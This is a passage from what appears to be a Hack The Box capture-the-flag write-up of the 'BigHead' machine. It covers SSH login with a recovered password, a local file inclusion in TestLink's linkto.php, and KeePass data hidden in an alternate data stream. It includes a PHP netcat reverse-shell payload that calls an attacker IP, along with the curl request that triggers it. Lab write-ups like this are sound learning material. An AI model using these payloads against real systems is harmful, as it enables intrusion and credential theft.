&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;4837334270555932557139552d5975677974354659556259302d553837743837&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/108.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-this-might-be-a-password--h73bpuy2uq9u-yugyt5fyuby0-u87t87-lets-check-passwordhash-&quot;&gt;So this might be a password : &lt;code class=&quot;highlighter-rouge&quot;&gt;H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87&lt;/code&gt;, Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;PasswordHash&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/109.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;3mrgnc3-sayz-tryharder-d-it-was-just-a-troll-anyway-we-have-a-password-lets-try-to-login-to-ssh-as-nignx-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;3mrgnc3 sayz TryHarder... ;D&lt;/code&gt;, It was just a troll. Anyway we have a password let’s try to login to ssh as &lt;code class=&quot;highlighter-rouge&quot;&gt;nignx&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/110.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-and-by-looking-at-the-files-i-figured-out-that-we-are-in-cxampp-&quot;&gt;It worked, and by looking at the files I figured out that we are in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\xampp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/111.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-was-also-a-usertxt-i-tried-to-read-it-but-it-said-that-it-was-a-binary-file-&quot;&gt;There was also a &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;, I tried to read it but it said that it was a binary file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/112.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-wanted-to-check-the-user-but-whoami-wasnt-there-&quot;&gt;I wanted to check the user but &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; wasn’t there :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/113.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-checked-help-and-this-shell-has-only-some-basic-commands-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; and this shell has only some basic commands :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/114.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-know-that-im-inside-cxampp-now-but-what-am-i-searching-for-anyway--i-went-back-to-the-meterpreter-shell-and-checked-the-access-log-of-nginx-in-cnginxlogs-&quot;&gt;I know that I’m inside &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\xampp&lt;/code&gt; now. But what am I searching for anyway ? I went back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; shell and checked the access log of &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\nginx\logs&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/115.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;at-the-beginning-of-the-log-i-found-some-requests-with-the-user-agent-3mrgnc3-&quot;&gt;At the beginning of the log I found some requests with the &lt;code class=&quot;highlighter-rouge&quot;&gt;user-agent&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;3mrgnc3&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/116.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;most-of-them-are-head-requests-maybe-he-was-testing-the-buffer-overflow-i-dont-really-know-but-anyway-we-are-not-looking-for-that-we-are-looking-for-requests-to-testlink-because-everything-we-have-access-to-on-port-5080-is-under-testlink&quot;&gt;Most of them are HEAD requests, maybe he was testing the buffer overflow I don’t really know but anyway we are not looking for that. We are looking for requests to &lt;code class=&quot;highlighter-rouge&quot;&gt;/testlink&lt;/code&gt;. Because everything we have access to on port 5080 is under &lt;code class=&quot;highlighter-rouge&quot;&gt;/testlink&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;on-the-7th-of-october-2018-at-021716-and-021806-i-found-two-post-requests-to-testlinklinktophp-&quot;&gt;On the 7th of October 2018 at 02:17:16 and 02:18:06 I found two POST requests to &lt;code class=&quot;highlighter-rouge&quot;&gt;/testlink/linkto.php&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/117.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-went-to-that-path-and-got-an-error-which-disclosed-the-path-of-the-php-file-&quot;&gt;I went to that path and got an error which disclosed the path of the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/118.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Fatal error: require_once(): Failed opening required '' (include_path='C:\xampp\php\PEAR;.;C:\xampp\apps\testlink\htdocs\lib\functions\;C:\xampp\apps\testlink\htdocs\lib\issuetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\codetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration\;C:\xampp\apps\testlink\htdocs\third_party\') in C:\xampp\apps\testlink\htdocs\linkto.php on line 62
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-path-was-cxamppappstestlinkhtdocslinktophp-so-i-went-there-and-got-the-php-file-&quot;&gt;The path was &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\xampp\apps\testlink\htdocs\linkto.php&lt;/code&gt; So I went there and got the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/119.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/120.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;lfi-in-linktophp-user-flag&quot;&gt;LFI in &lt;code class=&quot;highlighter-rouge&quot;&gt;linkto.php&lt;/code&gt;, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;its-a-long-script-so-i-will-just-focus-on-the-vulnerable-part-first-thing-i-noticed-was-this-comment-&quot;&gt;It’s a long script so I will just focus on the vulnerable part. First thing I noticed was this comment :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/121.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-checked-pipercoinphp-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;pipercoin.php&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/122.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;pipercoinphp-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pipercoin.php&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--                                                                                                                                        
TODO.. I just added a workaround to the linkto script for now.                                                                              
Nelson.                                                                                                                                     
--&amp;gt;                                                                                                                                         
&amp;lt;?php                                                                                                                                       
echo('PiperCoinAuth');                                                                                                                      
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;nothing-interesting-lets-go-back-to-linktophp&quot;&gt;Nothing interesting, Let’s go back to &lt;code class=&quot;highlighter-rouge&quot;&gt;linkto.php&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-noticed-here-that-we-can-send-a-post-request-with-the-parameters-piperid-and-pipercoinid-&quot;&gt;I noticed here that we can send a POST request with the parameters &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperID&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperCoinID&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(isset($_POST['PiperID'])){$PiperCoinAuth = $_POST['PiperCoinID']; //plugins/ppiper/pipercoin.php                                         
        $PiperCoinSess = base64_decode($PiperCoinAuth);                                                                                     
        $PiperCoinAvitar = (string)$PiperCoinSess;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;piperid-is-not-important-but-pipercoinid-is-its-taking-the-value-of-pipercoinid-and-assigning-it-to-another-variable-called-pipercoinauth-after-that-its-calling-require_once-with-pipercoinauth&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PiperID&lt;/code&gt; is not important but &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperCoinID&lt;/code&gt; is. It’s taking the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperCoinID&lt;/code&gt; and assigning it to another variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;$PiperCoinAuth&lt;/code&gt;. After that it’s calling &lt;a href=&quot;https://www.php.net/manual/en/function.require-once.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;require_once()&lt;/code&gt;&lt;/a&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;$PiperCoinAuth&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/123.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-vulnerability-here-is-obvious-if-we-can-control-whats-in-require_once-then-we-can-make-it-include-any-php-file-of-our-choice-local-file-inclusion&quot;&gt;The vulnerability here is obvious. If we can control what’s in &lt;code class=&quot;highlighter-rouge&quot;&gt;require_once()&lt;/code&gt; Then we can make it include any &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file of our choice (Local File Inclusion).&lt;/h4&gt;
&lt;h4 id=&quot;i-created-a-simple-php-script-to-execute-ncexe-and-give-me-a-reverse-shell-&quot;&gt;I created a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; script to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; and give me a reverse shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/124.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-uploaded-it-and-uploaded-ncexe-to-cusersnelsonappdatalocaltemp-&quot;&gt;I uploaded it and uploaded &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson\AppData\Local\Temp\&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/125.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;last-step-is-to-exploit-the-vulnerability-we-will-send-a-post-request-to-httpcodebigheadhtbtestlinklinktophp-with-the-parameters-piperid-we-can-leave-it-empty-and-pipercoinid-which-will-be-the-path-of-the-php-script-cusersnelsonappdatalocaltemprevphp-&quot;&gt;Last step is to exploit the vulnerability. We will send a POST request to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://code.bighead.htb/testlink/linkto.php&lt;/code&gt; With the parameters &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperID&lt;/code&gt; (we can leave it empty) and &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperCoinID&lt;/code&gt; which will be the path of the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; script (&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson\AppData\Local\Temp\rev.php&lt;/code&gt;) :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;curl -X POST &quot;http://code.bighead.htb/testlink/linkto.php&quot; -d &quot;PiperID=&amp;amp;PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\rev.php&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/126.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-a-reverse-shell-immediately-as-nt-authoritysystem-&quot;&gt;We get a reverse shell immediately. As &lt;code class=&quot;highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/127.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;awesome-now-we-can-get-root-and-user-flags-right--well--no-lets-get-the-user-flag-first-&quot;&gt;Awesome now we can get root and user flags, right ? well … no. Let’s get the user flag first :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/128.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;alternate-data-stream-in-roottxt&quot;&gt;Alternate Data Stream in &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;technically-we-own-root-now-but-we-still-need-to-do-some-more-stuff-to-get-the-root-flag&quot;&gt;Technically we own root now. But we still need to do some more stuff to get the root flag.&lt;/h4&gt;
&lt;h4 id=&quot;i-looked-in-cusersadministratordesktop-and-the-root-flag-wasnt-there&quot;&gt;I looked in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Administrator\Desktop&lt;/code&gt; and the root flag wasn’t there.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/129.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-thought-it-might-be-hidden-so-i-tried-to-read-it-anyway-and-yes-it-was-hidden-but-&quot;&gt;I thought it might be hidden, so I tried to read it anyway and yes it was hidden. but …&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/130.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;gilfoyles-prayer-another-silicon-valley-reference-i-terminated-the-meterpreter-session-i-had-as-nelson-then-i-went-to-cusersnelsonappdatalocaltemp-and-executed-mexe-to-get-another-meterpreter-session-as-nt-authoritysystem-after-that-i-uploaded-streamsexe-to-check-for-alternate-data-streams-on-roottxt-&quot;&gt;Gilfoyle’s Prayer? Another “Silicon Valley” reference. I terminated the &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session I had as &lt;code class=&quot;highlighter-rouge&quot;&gt;Nelson&lt;/code&gt; then I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson\AppData\Local\Temp&lt;/code&gt; and executed &lt;code class=&quot;highlighter-rouge&quot;&gt;m.exe&lt;/code&gt; to get another &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session as &lt;code class=&quot;highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt;. After that I uploaded &lt;code class=&quot;highlighter-rouge&quot;&gt;streams.exe&lt;/code&gt; to check for alternate data streams on root.txt :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/131.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/132.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/133.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;streams C:\Users\Administrator\Desktop\root.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/134.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-is-an-alternate-stream-called-zoneidentifier-i-tried-to-read-it-but-type-and-more-didnt-work-for-some-reason&quot;&gt;There is an alternate stream called &lt;code class=&quot;highlighter-rouge&quot;&gt;Zone.Identifier&lt;/code&gt;, I tried to read it but &lt;code class=&quot;highlighter-rouge&quot;&gt;type&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;more&lt;/code&gt; didn’t work for some reason.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/135.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/136.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-reading-this-article-i-did-it-like-this--more--cusersadministratordesktoproottxtzoneidentifier-and-saved-the-output-to-a-file-and-named-it-test&quot;&gt;After reading &lt;a href=&quot;https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/&quot;&gt;this article&lt;/a&gt; I did it like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;more &amp;lt; &quot;C:\Users\Administrator\Desktop\root.txt:Zone.Identifier&quot;&lt;/code&gt; and saved the output to a file and named it &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/137.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/138.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;when-i-looked-at-test-i-found-that-it-was-a-binary-file-&quot;&gt;When I looked at &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; I found that it was a binary file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/139.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-downloaded-it-to-use-file-against-it-&quot;&gt;So I downloaded it to use &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; against it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/140.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/141.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;keepass-password-database&quot;&gt;Keepass password database&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;cracking-the-database-root-flag&quot;&gt;Cracking the Database, Root Flag&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;KeePass Password Safe is a free and open-source password manager primarily for Windows. It officially supports macOS and Linux operating systems through the use of Mono. Additionally, there are several unofficial ports for Windows Phone, Android, iOS, and BlackBerry devices. -&lt;a href=&quot;https://en.wikipedia.org/wiki/KeePass&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;i-renamed-the-file-to-testkdbx-&quot;&gt;I renamed the file to &lt;code class=&quot;highlighter-rouge&quot;&gt;test.kdbx&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/142.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-used-keepass2-to-open-it-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;keepass2&lt;/code&gt; to open it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/143.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/144.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-of-course-we-need-a-password-and-a-key-i-went-back-to-the-shell-and-checked-the-configuration-file-for-keepass-in-cusersadministratorappdataroamingkeepass&quot;&gt;And of course we need a password and a key. I went back to the shell and checked the configuration file for &lt;code class=&quot;highlighter-rouge&quot;&gt;keepass&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Administrator\AppData\Roaming\KeePass&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/145.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/146.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;keepassconfigxml-&quot;&gt;KeePass.config.xml :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Configuration&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xsi=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xsd=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Meta&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;PreferUserConfiguration&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/PreferUserConfiguration&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;OmitItemsWithDefaultValues&amp;gt;&lt;/span&gt;true&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OmitItemsWithDefaultValues&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;DpiFactorX&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DpiFactorX&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;DpiFactorY&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DpiFactorY&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Meta&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Application&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;LastUsedFile&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Path&amp;gt;&lt;/span&gt;..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Path&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CredProtMode&amp;gt;&lt;/span&gt;Obf&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CredProtMode&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CredSaveMode&amp;gt;&lt;/span&gt;NoSave&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CredSaveMode&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LastUsedFile&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;MostRecentlyUsed&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;MaxItemCount&amp;gt;&lt;/span&gt;12&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MaxItemCount&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Items&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;ConnectionInfo&amp;gt;&lt;/span&gt;
					&lt;span class=&quot;nt&quot;&gt;&amp;lt;Path&amp;gt;&lt;/span&gt;..\..\Users\Administrator\Desktop\chest.kdbx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Path&amp;gt;&lt;/span&gt;
					&lt;span class=&quot;nt&quot;&gt;&amp;lt;CredProtMode&amp;gt;&lt;/span&gt;Obf&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CredProtMode&amp;gt;&lt;/span&gt;
					&lt;span class=&quot;nt&quot;&gt;&amp;lt;CredSaveMode&amp;gt;&lt;/span&gt;NoSave&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CredSaveMode&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ConnectionInfo&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Items&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MostRecentlyUsed&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;WorkingDirectories&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Item&amp;gt;&lt;/span&gt;Database@..\..\Users\Administrator\Desktop&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Item&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Item&amp;gt;&lt;/span&gt;KeyFile@..\..\Users\Administrator\Desktop&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Item&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/WorkingDirectories&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Start&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CheckForUpdate&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CheckForUpdate&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CheckForUpdateConfigured&amp;gt;&lt;/span&gt;true&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CheckForUpdateConfigured&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Start&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;FileOpening&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;FileClosing&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;TriggerSystem&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Triggers&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/TriggerSystem&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;PluginCompatibility&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Application&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Logging&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;MainWindow&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;X&amp;gt;&lt;/span&gt;2&lt;span class=&quot;nt&quot;&gt;&amp;lt;/X&amp;gt;&lt;/span&gt;
